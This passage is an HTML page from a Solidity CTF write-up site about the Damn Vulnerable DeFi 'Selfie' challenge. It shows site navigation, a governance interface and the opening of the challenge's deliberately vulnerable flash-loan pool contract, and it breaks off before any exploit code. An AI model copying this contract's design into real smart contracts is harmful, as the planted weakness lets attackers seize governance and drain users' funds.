@@ -1,0 +1,1404 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../05.%20The%20Rewarder/">
+      
+      
+        <link rel="next" href="../11.%20Backdoor/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.6">
+    
+    
+      
+        <title>Selfie - Solidity CTFs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.558e4712.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#selfie" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Solidity CTFs" class="md-header__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Solidity CTFs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Selfie
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    dmtrbch/solidity-ctfs
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Solidity CTFs" class="md-nav__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Solidity CTFs
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    dmtrbch/solidity-ctfs
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome!
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
+          1. Ethernaut
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="1. Ethernaut" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          1. Ethernaut
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/01.%20Fallback/" class="md-nav__link">
+        Fallback
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/02.%20Fallout/" class="md-nav__link">
+        Fallout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/03.%20Coin%20Flip/" class="md-nav__link">
+        Coin Flip
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/04.%20Telephone/" class="md-nav__link">
+        Telephone
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/05.%20Token/" class="md-nav__link">
+        Token
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/06.%20Delegation/" class="md-nav__link">
+        Delegation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/07.%20Force/" class="md-nav__link">
+        Force
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/08.%20Vault/" class="md-nav__link">
+        Vault
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/09.%20King/" class="md-nav__link">
+        King
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/10.%20Re-entrancy/" class="md-nav__link">
+        Re-entrancy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/11.%20Elevator/" class="md-nav__link">
+        Elevator
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/15.%20Naught%20Coin/" class="md-nav__link">
+        Naught Coin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/16.%20Preservation/" class="md-nav__link">
+        Preservation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/17.%20Recovery/" class="md-nav__link">
+        Recovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/20.%20Denial/" class="md-nav__link">
+        Denial
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/21.%20Shop/" class="md-nav__link">
+        Shop
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/23.%20Dex%20Two/" class="md-nav__link">
+        Dex Two
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/24.%20Puzzle%20Wallet/" class="md-nav__link">
+        Puzzle Wallet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Ethernaut/25.%20Motorbike/" class="md-nav__link">
+        Motorbike
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
+          2. Capture the Ether
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="2. Capture the Ether" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          2. Capture the Ether
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/" class="md-nav__link">
+        Guess the number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/" class="md-nav__link">
+        Guess the secret number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/" class="md-nav__link">
+        Guess the random number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/" class="md-nav__link">
+        Guess the new number
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/" class="md-nav__link">
+        Predict the future
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/" class="md-nav__link">
+        Predict the block hash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/07.%20Token%20sale/" class="md-nav__link">
+        Token sale
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/08.%20Token%20whale/" class="md-nav__link">
+        Token whale
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/09.%20Retirement%20fund/" class="md-nav__link">
+        Retirement fund
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Capture%20the%20Ether/10.%20Token%20bank/" class="md-nav__link">
+        Token bank
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
+          3. Damn Vulnerable Defi
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="3. Damn Vulnerable Defi" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          3. Damn Vulnerable Defi
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01.%20Unstoppable/" class="md-nav__link">
+        Unstoppable
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02.%20Naive%20receiver/" class="md-nav__link">
+        Naive receiver
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03.%20Truster/" class="md-nav__link">
+        Truster
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04.%20Side%20Entrance/" class="md-nav__link">
+        Side Entrance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05.%20The%20Rewarder/" class="md-nav__link">
+        The Rewarder
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Selfie
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Selfie
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#goal" class="md-nav__link">
+    Goal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-contract-code" class="md-nav__link">
+    Attacker contract code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution-code" class="md-nav__link">
+    Solution code
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11.%20Backdoor/" class="md-nav__link">
+        Backdoor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../12.%20Climber/" class="md-nav__link">
+        Climber
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#goal" class="md-nav__link">
+    Goal
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-contract-code" class="md-nav__link">
+    Attacker contract code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution-code" class="md-nav__link">
+    Solution code
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+
+<h1 id="selfie">Selfie</h1>
+<p>ISimpleGovernance.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="n">pragma</span><span class="w"> </span><span class="n">solidity</span><span class="w"> </span>^<span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="n">interface</span><span class="w"> </span><span class="n">ISimpleGovernance</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nb">struct</span><span class="w"> </span><span class="n">GovernanceAction</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">uint128</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
+<span class="w">        </span><span class="n">uint64</span><span class="w"> </span><span class="n">proposedAt</span><span class="p">;</span>
+<span class="w">        </span><span class="n">uint64</span><span class="w"> </span><span class="n">executedAt</span><span class="p">;</span>
+<span class="w">        </span><span class="n">address</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
+<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nb">error</span><span class="w"> </span><span class="n">NotEnoughVotes</span><span class="p">(</span><span class="n">address</span><span class="w"> </span><span class="nb">who</span><span class="p">);</span>
+<span class="w">    </span><span class="nb">error</span><span class="w"> </span><span class="n">CannotExecute</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">);</span>
+<span class="w">    </span><span class="nb">error</span><span class="w"> </span><span class="n">InvalidTarget</span><span class="p">();</span>
+<span class="w">    </span><span class="nb">error</span><span class="w"> </span><span class="n">TargetMustHaveCode</span><span class="p">();</span>
+<span class="w">    </span><span class="nb">error</span><span class="w"> </span><span class="n">ActionFailed</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">event</span><span class="w"> </span><span class="n">ActionQueued</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">,</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">indexed</span><span class="w"> </span><span class="n">caller</span><span class="p">);</span>
+<span class="w">    </span><span class="n">event</span><span class="w"> </span><span class="n">ActionExecuted</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">,</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">indexed</span><span class="w"> </span><span class="n">caller</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">queueAction</span><span class="p">(</span><span class="n">address</span><span class="w"> </span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="n">uint128</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">calldata</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">);</span>
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">executeAction</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">)</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">payable</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">returndata</span><span class="p">);</span>
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">getActionDelay</span><span class="p">()</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">view</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">delay</span><span class="p">);</span>
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">getGovernanceToken</span><span class="p">()</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">view</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">address</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">getAction</span><span class="p">(</span><span class="n">uint256</span><span class="w"> </span><span class="n">actionId</span><span class="p">)</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">view</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">GovernanceAction</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">action</span><span class="p">);</span>
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">getActionCounter</span><span class="p">()</span><span class="w"> </span><span class="n">external</span><span class="w"> </span><span class="n">view</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="p">(</span><span class="n">uint256</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>SelfiePool.sol</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
+<span class="kn">import</span> <span class="s2">&quot;./SimpleGovernance.sol&quot;</span><span class="p">;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="nd">@title</span> <span class="n">SelfiePool</span>
+ <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
+ <span class="o">*/</span>
+<span class="n">contract</span> <span class="n">SelfiePool</span> <span class="ow">is</span> <span class="n">ReentrancyGuard</span><span class="p">,</span> <span class="n">IERC3156FlashLender</span> <span class="p">{</span>
+
+    <span class="n">ERC20Snapshot</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">token</span><span class="p">;</span>
+    <span class="n">SimpleGovernance</span> <span class="n">public</span> <span class="n">immutable</span> <span class="n">governance</span><span class="p">;</span>
+    <span class="n">bytes32</span> <span class="n">private</span> <span class="n">constant</span> <span class="n">CALLBACK_SUCCESS</span> <span class="o">=</span> <span class="n">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
+
+    <span class="n">error</span> <span class="n">RepayFailed</span><span class="p">();</span>
+    <span class="n">error</span> <span class="n">CallerNotGovernance</span><span class="p">();</span>
+    <span class="n">error</span> <span class="n">UnsupportedCurrency</span><span class="p">();</span>
+    <span class="n">error</span> <span class="n">CallbackFailed</span><span class="p">();</span>
+
+    <span class="n">event</span> <span class="n">FundsDrained</span><span class="p">(</span><span class="n">address</span> <span class="n">indexed</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">amount</span><span class="p">);</span>
+
+    <span class="n">modifier</span> <span class="n">onlyGovernance</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span> <span class="o">!=</span> <span class="n">address</span><span class="p">(</span><span class="n">governance</span><span class="p">))</span>
+            <span class="n">revert</span> <span class="n">CallerNotGovernance</span><span class="p">();</span>
+        <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">_token</span><span class="p">,</span> <span class="n">address</span> <span class="n">_governance</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">ERC20Snapshot</span><span class="p">(</span><span class="n">_token</span><span class="p">);</span>
